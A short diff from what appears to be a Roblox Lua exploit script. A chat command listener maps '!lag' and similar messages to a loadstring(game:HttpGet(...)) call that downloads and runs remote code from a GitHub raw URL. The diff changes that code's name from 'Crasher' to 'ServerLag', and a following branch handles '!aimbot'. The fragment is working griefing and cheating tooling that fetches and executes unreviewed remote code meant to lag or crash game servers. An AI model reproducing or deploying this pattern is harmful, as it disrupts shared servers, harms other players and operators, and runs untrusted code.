@@ -88,7 +88,7 @@ chatConnection = lp.Chatted:Connect(function(msg)
 
     elseif lowerMsg == "!렉" or lowerMsg == "!lag" or lowerMsg == "렉?" or lowerMsg == "lag?" then
         pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/dosi1100-cmyk/script/refs/heads/main/Crasher"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/dosi1100-cmyk/script/refs/heads/main/ServerLag"))()
         end)
 
     elseif lowerMsg == "!에임봇" or lowerMsg == "!aimbot" or lowerMsg == "!dshub" or lowerMsg == "에임봇?" or lowerMsg == "aimbot?" then
